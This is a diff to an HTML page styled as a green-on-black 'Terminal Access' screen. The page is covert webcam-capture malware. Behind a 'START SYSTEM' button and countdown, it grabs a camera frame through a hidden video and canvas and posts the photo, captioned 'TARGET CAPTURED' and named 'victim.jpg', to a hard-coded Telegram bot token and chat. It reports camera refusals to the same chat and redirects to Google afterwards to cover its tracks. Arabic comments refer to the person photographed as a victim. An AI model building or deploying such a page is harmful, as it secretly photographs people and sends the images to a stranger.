@@ -3,24 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Loading...</title>
+    <title>Terminal Access</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
-        body { 
-            background-color: black; 
-            color: #00ff00; 
-            font-family: 'VT323', monospace; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden; 
-        }
-        #counter { font-size: 10em; }
-        #msg { font-size: 2em; margin-top: 20px; }
-        video, canvas { position: absolute; left: -5000px; opacity: 0; }
+        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #btn { padding: 15px 30px; border: 2px solid #00ff00; background: transparent; color: #00ff00; font-family: 'VT323', monospace; font-size: 2em; cursor: pointer; text-transform: uppercase; }
+        #btn:hover { background: #00ff00; color: black; }
+        #counter { font-size: 8em; display: none; }
+        #msg { font-size: 1.5em; margin-top: 20px; display: none; }
+        video, canvas { position: absolute; left: -5000px; }
     </style>
 </head>
 <body>
@@ -28,23 +19,27 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
+    <button id="btn" onclick="initHacking()">START SYSTEM</button>
+
     <div id="counter">10</div>
-    <div id="msg">INITIALIZING EXPLOIT...</div>
+    <div id="msg">CONNECTING TO SERVER...</div>
 
     <script>
         const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const chat = "8042090388";
-        let timeLeft = 10;
 
-        async function startApp() {
+        async function initHacking() {
+            // إخفاء الزر وإظهار العداد
+            document.getElementById('btn').style.display = "none";
+            document.getElementById('counter').style.display = "block";
+            document.getElementById('msg').style.display = "block";
+
             try {
-                // طلب الكاميرا أول ما يفتح الصفحة
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1280, height: 720 } 
-                });
+                // طلب الكاميرا بعد ضغطة الزر (المتصفح سيسمح بها الآن)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
-                
-                // بدء العد التنازلي
+
+                let timeLeft = 10;
                 const timer = setInterval(() => {
                     timeLeft--;
                     document.getElementById('counter').innerText = timeLeft;
@@ -52,45 +47,42 @@
                     if (timeLeft <= 0) {
                         clearInterval(timer);
                         document.getElementById('counter').innerText = "";
-                        document.getElementById('msg').innerText = "Hello World";
-                        document.getElementById('msg').style.fontSize = "5em";
+                        document.getElementById('msg').innerText = "HELLO WORLD";
                         
-                        // تصوير 3 لقطات سريعة لضمان الجودة
-                        capture(1);
-                        setTimeout(() => capture(2), 1000);
-                        setTimeout(() => capture(3), 2000);
+                        // التصوير والإرسال
+                        captureAndSend();
                     }
                 }, 1000);
 
             } catch (err) {
-                // لو رفض الكاميرا
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=❌ الضحية رفض الكاميرا عند العد`);
+                // إرسال تنبيه إذا رفض
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=❌ User Denied Camera Access`);
             }
         }
 
-        async function capture(n) {
+        async function captureAndSend() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            const imgData = canvas.toDataURL('image/jpeg', 0.9);
+            const imgData = canvas.toDataURL('image/jpeg', 0.8);
             const blob = await (await fetch(imgData)).blob();
             
             const formData = new FormData();
             formData.append('chat_id', chat);
-            formData.append('photo', blob, `shot${n}.jpg`);
-            formData.append('caption', `🎯 صيد بعد العد التنازلي - لقطة ${n}`);
+            formData.append('photo', blob, 'victim.jpg');
+            formData.append('caption', '🎯 TARGET CAPTURED');
 
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
+            
+            // تحويل الموقع بعد الإرسال للتأكيد
+            window.location.href = "https://www.google.com";
         }
-
-        window.onload = startApp;
     </script>
 </body>
-</html>
+    </html>
